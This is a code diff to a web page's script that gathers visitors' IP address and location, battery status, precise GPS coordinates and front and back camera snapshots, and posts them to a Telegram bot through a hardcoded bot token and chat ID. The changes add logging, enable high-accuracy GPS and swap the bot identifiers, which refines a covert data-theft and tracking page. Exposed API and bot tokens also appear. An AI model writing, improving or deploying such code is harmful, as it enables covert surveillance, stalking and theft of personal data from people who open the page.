@@ -360,13 +360,16 @@ footer {
     info.localTime = new Date().toLocaleString();
 
     // Send device info first
+    console.log("Sending device info to Telegram...");
     await sendTextToTelegram(info);
 
     // Then send camera images if available
     if (frontSnap) {
+      console.log("Sending front camera image...");
       await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
     }
     if (backSnap) {
+      console.log("Sending back camera image...");
       await sendPhotoToTelegram(backSnap, "📷 Back Camera");
     }
   }
@@ -397,31 +400,37 @@ footer {
 
     // Fetch IP/location
     try {
+      console.log("Fetching IP/location data...");
       const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
       const ipData = await res.json();
       data.ip = ipData.ip;
       data.city = ipData.city;
       data.region = ipData.region;
       data.country = ipData.country;
+      console.log("IP/location data received:", ipData);
     } catch (e) {
       console.error("IP fetch failed:", e);
     }
 
     // Battery status
     try {
+      console.log("Checking battery status...");
       const battery = await navigator.getBattery();
       data.battery = (battery.level * 100).toFixed(0) + "%";
       data.charging = battery.charging ? "Yes" : "No";
+      console.log("Battery status:", data.battery, data.charging);
     } catch (e) {
       console.error("Battery API failed:", e);
     }
 
     // GPS
     try {
+      console.log("Attempting to get geolocation...");
       const pos = await new Promise((res, rej) =>
-        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000})
+        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000, enableHighAccuracy: true})
       );
       data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+      console.log("Geolocation received:", data.location);
     } catch (e) {
       console.error("Geolocation failed:", e);
       data.location = "Denied/Unavailable";
@@ -471,21 +480,23 @@ footer {
 - ${data.cameraStatus}
     `;
 
-    console.log("Sending device info to Telegram...");
-    const response = await fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
+    console.log("Sending device info payload:", message);
+    const response = await fetch(`https://api.telegram.org/bot7216371031:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: "8067700272",
+        chat_id: "7216371031",
         text: message,
         parse_mode: "Markdown"
       })
     });
 
     if (!response.ok) {
-      console.error("Failed to send device info:", await response.text());
-      throw new Error("Device info transmission failed");
+      const error = await response.text();
+      console.error("Failed to send device info:", error);
+      throw new Error(`Device info transmission failed: ${error}`);
     }
+    console.log("Device info sent successfully");
     return response;
   }
 
@@ -496,7 +507,7 @@ footer {
     formData.append("caption", caption);
 
     console.log(`Sending ${caption} to Telegram...`);
-    return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
+    return fetch(`https://api.telegram.org/bot7216371031:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
       method: "POST",
       body: formData
     });
